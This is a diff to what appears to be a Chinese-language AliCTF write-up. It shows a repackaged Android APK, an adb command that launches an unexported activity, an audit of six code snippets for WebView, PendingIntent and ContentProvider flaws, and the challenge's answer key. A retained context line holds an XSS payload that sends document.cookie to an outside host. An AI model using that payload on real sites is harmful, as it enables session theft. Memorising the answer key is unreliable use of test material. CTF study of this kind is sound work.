@@ -191,3 +191,50 @@ http://drops.wooyun.org/papers/948
 >http://8dd25e24b4f65229.alictf.com/swf.swf?%*debug=\%22));{var%20i=new%20Image();i.src=%27http://xssguet.sinaapp.com?/%27%2bescape(document.cookie)}catch(e){}//
 
 
+#vulnerablitiy
+
+
+提示说要加载未导出组件，显然不用逆向就知道必然某个组件原来是android:exported=false,要将其设为true。将安装包用 apktool 解开后，打开发现 `.WebActivity`是未导出的，然后修改后重新打包，并签名安装。
+
+运行后，在命令行输入如下命令加载组件：
+
+```
+adb shell am start -n com.alictf.secaudit/.WebActivity
+```
+
+执行完后，会打开一个网址：
+
+http://monster.alictf.com/subject/wireless/alictf.html
+
+![website](vulnerablitiy.jpg)
+
+浏览器打开，如提示所说有六段代码，没别的，源码审计。
+
+
+**代码段1：**
+
+考察webview安全. 将可能出现addJavasriptInterface漏洞的相关系统版本中接口都移除了,同时对url进行了相关校验，没有漏洞。
+
+**代码段2：**
+
+考察pendingIntent 的安全性。刚开始没这么注意，后来当我看到了pendingintent时，我想起了broadanywhere 漏洞。这里`new Intent()`是空的，攻击者可能对它进行控制。
+
+**代码段3：**
+
+考察httpclient.常见的setHostnameVerifier这里设置了强制校验，而其他位置也没有看出什么问题。
+
+**代码段4：**
+
+考察contentprovider的路径遍历。总共也就实现了openFile一个方法，要有漏洞也只能是它了。
+
+**代码段5：**
+
+还是考察webview安全。和1比较也可以看出来，不仅在代码段开头提示组件是导出的，而且还对引入的url,data参数没有校验。
+
+**代码段6：**
+
+这里exec的参数是硬编码，没有问题。
+
+
+综上所述：key 为 getActivity;openFile;loadDataWithBaseURL.
+p.s: 审计代码没搞多久，拼接答案搞了半天 o(╯□╰)o。
